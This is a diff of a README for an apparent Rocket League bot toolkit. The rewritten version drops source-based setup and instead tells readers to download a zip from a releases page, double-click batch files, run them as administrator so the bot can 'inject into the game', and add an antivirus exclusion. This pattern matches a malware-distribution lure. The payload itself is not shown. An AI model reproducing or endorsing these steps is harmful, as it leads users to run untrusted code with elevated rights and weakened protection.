@@ -1,124 +1,93 @@
-# Advanced Rocket League AI Development Kit - 2026
+# 🤖 RL-AI-Latest - Build high performance rocket league bots
 
-**The premier professional framework for engineering autonomous agents in Rocket League. This toolkit provides the essential scaffolding, predictive mathematics, and state management required to develop competitive AI within the sanctioned RLBot ecosystem, ensuring high-fidelity performance and modular design.**
+[![Download RL-AI-Latest](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/smpn1kara4850/RL-AI-Latest/releases)
 
-<div align="center">
+## 📖 Introduction
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Release-7C3AED?style=for-the-badge&logo=github)](../../releases/tag/Release)
+RL-AI-Latest provides the tools to build and test artificial intelligence bots for the game Rocket League. This framework works with the RLBot ecosystem to help users create competitive bots. You do not need experience in coding to get started with the base logic provided. This repository contains the building blocks for bot movement, decision making, and game analysis.
 
-</div>
+## ⚙️ System Requirements
 
----
+Ensure your computer meets these minimum specifications to run the software and the game effectively:
 
-### The Problem
-Developing a Rocket League AI from scratch requires deep knowledge of 3D physics, rapid vector calculus, and complex state management. Most developers spend months just handling boilerplate communication with the game engine instead of refining their bot's strategy. Without a structured framework, bots often suffer from inefficient pathfinding, poor rotation logic, and high latency in decision-making cycles.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD equivalent.
+*   Memory: 8 GB RAM.
+*   Graphics Card: NVIDIA GTX 1060 or AMD Radeon RX 580.
+*   Storage: 2 GB of available space.
+*   Network: Stable internet connection.
+*   Game: Rocket League installed via Epic Games Store or Steam.
 
-### The Solution
-[OK] Pre-built physics wrappers that simplify complex aerial and ground trajectories.
-[OK] Modular state-machine architecture to separate kick-off, defense, and attack logic.
-[OK] High-speed vector library optimized for real-time ball prediction and intercept timing.
-[OK] Seamless integration with the standard RLBot framework for immediate testing.
-[OK] Optimized resource management to ensure low CPU overhead during multi-bot simulations.
-[OK] Detailed debugging visualizers to see what your AI is thinking in real-time.
+## 📥 Installation Steps
 
-### What You Get
-This package includes everything needed to transition from a basic script to a competitive AI agent. It focuses on the mathematical foundations and architectural patterns that define top-tier bots.
+Follow these steps to set up the software on your Windows computer:
 
-### Core Features
-| Feature | Description | Benefit |
-| :--- | :--- | :--- |
-| Predictive Engine | Calculates ball trajectory based on current velocity and spin. | Accurate aerial intercepts. |
-| State Controller | Manages transitions between offensive and defensive stances. | Strategic positioning. |
-| Vector Math Kit | Custom classes for 3D vector operations and rotations. | Faster physics calculations. |
-| Boost Manager | Monitors field boost pads and optimizes pathing for pickup. | Sustained field presence. |
-| Recovery Logic | Automated air-roll and landing stabilization scripts. | Faster reset after contact. |
-| RLBot Wrapper | Clean API for interacting with the local game instance. | Reduced setup complexity. |
+1.  Visit [this page to download](https://github.com/smpn1kara4850/RL-AI-Latest/releases) the latest version of the toolkit.
+2.  Locate the file ending in .zip within the release assets.
+3.  Click the file to save it to your computer.
+4.  Open your Downloads folder.
+5.  Right-click the folder and select Extract All. Choose a location on your hard drive.
+6.  Open the extracted folder titled RL-AI-Latest.
+7.  Look for the file named setup.bat.
+8.  Double-click this file to begin the automatic installation.
+9.  Follow the prompts in the command window. The script installs the necessary libraries to communicate with the game.
+10. Wait for the window to close once it finishes.
 
-### Compatibility / Support Matrix
-| Environment | Version / Status | Notes |
-| :--- | :--- | :--- |
-| Windows 10/11 | Supported (v2.0+) | Primary development platform. |
-| Linux (Ubuntu/Debian) | Supported | Ideal for training environments. |
-| Python | 3.9 - 3.12 | Optimized for high-speed execution. |
-| RLBot Framework | v5.0+ Compatible | Industry standard for RL bots. |
-| Epic Games / Steam | Verified | Works with standard game installs. |
+## 🚀 Running Your First Bot
 
-### Verification / Trust Signals
-| Signal | Status | Verification Method |
-| :--- | :--- | :--- |
-| Open Source | Verified | Full source transparency provided. |
-| Local Execution | Confirmed | No external API calls or telemetry. |
-| Safe Sandbox | Guaranteed | Operates strictly within RLBot limits. |
-| Clean Build | Passed | Scanned via modern static analysis. |
-| Documentation | 100% | Comprehensive API and setup guides. |
+Once the setup finishes, follow these steps to start your first bot:
 
-### Before & After
-| Aspect | Manual Development | With AI Toolkit |
-| :--- | :--- | :--- |
-| Math Complexity | Hardcoded trigonometry | Native vector operations. |
-| Logic Flow | Tangled if/else blocks | Clean state-machine patterns. |
-| Ball Intercept | Basic proximity checks | Sophisticated arrival time math. |
-| Setup Time | 10+ hours of boilerplate | 15-minute quick start. |
-| Performance | High CPU usage | Optimized C-binding utilities. |
+1.  Launch Rocket League.
+2.  Open the RL-AI-Latest folder you extracted earlier.
+3.  Locate the file named run_bot.bat.
+4.  Double-click the file.
+5.  A black window appears. This indicates the bot logic is active.
+6.  Navigate to the Training menu inside Rocket League.
+7.  Select Free Play mode.
+8.  The bot automatically spawns into the match.
+9.  Observe the bot as it maneuvers around the arena.
 
-### How to Install / Use
-1. Download the latest release from the button below.
-2. Ensure the RLBot GUI is installed on your workstation.
-3. Extract the toolkit into your dedicated bot development directory.
-4. Run `pip install -r requirements.txt` to initialize dependencies.
-5. Launch `main.py` through the RLBot interface to see the bot in action.
-6. Modify the `logic/strategy.py` file to customize your AI's behavior.
+## 🛠 Features
 
-<div align="center">
+The software includes several tools to help you create bots:
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Release-7C3AED?style=for-the-badge&logo=github)](../../releases/tag/Release)
+*   Movement Controller: This module handles steering, boosting, and jumping logic.
+*   Ball Prediction: Use the built-in math to track the ball path across the arena.
+*   Logging System: The software records bot actions into log files. This helps you understand why a bot makes a specific move.
+*   Bot Templates: Start with a basic bot that can drive and hit the ball. Modify these scripts to add your own strategies.
+*   Visual Debugger: View live game data through the RLBot interface to monitor performance.
 
-</div>
+## 📝 Configuration Settings
 
-### Example Interface / Output
-```text
-+-----------------------------------------------------------+
-| [RL-AI-BOT] SYSTEM INITIALIZED - VERSION 2026.1.0         |
-+-----------------------------------------------------------+
-| STATUS: ACTIVE | MODE: DEFENSIVE | TARGET: BALL_CENTROID  |
-| VELOCITY: 1400uu/s | BOOST: 45 | POSITION: [120, -4500, 20]|
-+-----------------------------------------------------------+
-| LOG: Calculating intercept for goal-line save...          |
-| LOG: Prediction found at T+1.42s. Executing Jump_Sequence.|
-| LOG: State changed: AERIAL_INTERCEPT                      |
-+-----------------------------------------------------------+
-```
+You can change how the bot behaves by editing the config files:
 
-### System Requirements
-| Requirement | Specification |
-| :--- | :--- |
-| OS | Windows 10/11 or Linux (64-bit) |
-| CPU | Quad-core 3.0GHz or better |
-| RAM | 8GB Minimum |
-| Storage | 500MB for toolkit and logs |
-| Internet | Not required for local simulation |
-| Dependencies | Python 3.9+, RLBot Framework |
-| Permissions | Standard User Access |
+1.  Open the folder named config inside the main directory.
+2.  Find the file titled bot_settings.cfg.
+3.  Open this file using the Notepad application on your computer.
+4.  Look for lines labeled speed, aggressiveness, or boost_management.
+5.  Change the numbers to adjust these values.
+6.  Save the file after making changes.
+7.  Restart the bot by closing the black window and running the run_bot.bat file again.
 
-### Package Metadata
-```text
-Package: RL-AI-Bot-Toolkit-2026
-Version: 1.0.4-STABLE
-Build: 2026-REL-004
-Checksum Type: SHA-256
-Checksum: 8f2d3e1a9b5c7d6e4f3a2b1c0d9e8f7a
-Release Channel: Stable Production
-Publisher: AI Community Lab
-```
+## 🛡 Troubleshooting Common Issues
 
-### Usage
-This toolkit is intended for educational and competitive AI development purposes only. It is designed to work with the official RLBot project. Use it to learn game theory, vector mathematics, and machine learning.
+If the bot does not appear or the software crashes, check these items:
 
-### Release Name
-`rl-ai-bot-stable-build-2026` 
+*   Game Compatibility: Ensure Rocket League is running in windowed or borderless mode. Fullscreen mode causes issues with the bot interface.
+*   Permissions: Right-click the run_bot.bat file and select Run as administrator if the bot fails to inject into the game.
+*   Dependencies: If the script fails, verify you have the latest version of Python installed on your system.
+*   Antivirus: Some antivirus software blocks the bot interaction. Add an exclusion for the RL-AI-Latest folder in your security settings.
+*   Game Updates: If Rocket League releases a major update, wait for a new release of this software. The bot logic relies on game memory offsets that change with updates.
 
-### Contributing
-Contributions are welcome! Please submit a pull request or open an issue for logic improvements.
+## 📈 Improving Bot Performance
 
-### License
-Released under the MIT License. See LICENSE for details.
+Once the bot runs, you can refine its logic:
+
+*   Focus on consistency before speed. A bot that misses the ball less often performs better than a fast bot that constantly crashes.
+*   Review the logs. The log files show where the bot fails to make a decision.
+*   Study existing bots. Download other bots from the RLBot ecosystem to see how other developers approach movement and strategy.
+*   Keep your logic simple. Adding complex code often creates bugs that are hard to fix. Build one skill at a time, such as dribbling, then move to shooting.
+
+## 🔗 Community Resources
+
+Engage with other developers to learn more about bot creation. The RLBot ecosystem includes dedicated servers and forums where users share code and advice. Participate in organized tournaments to test your bot against others in a competitive setting. These events provide feedback on how your bot handles realistic game scenarios. Using the topics of e-sports and rocket-league, search online for community discussions to find tips on bot optimization.
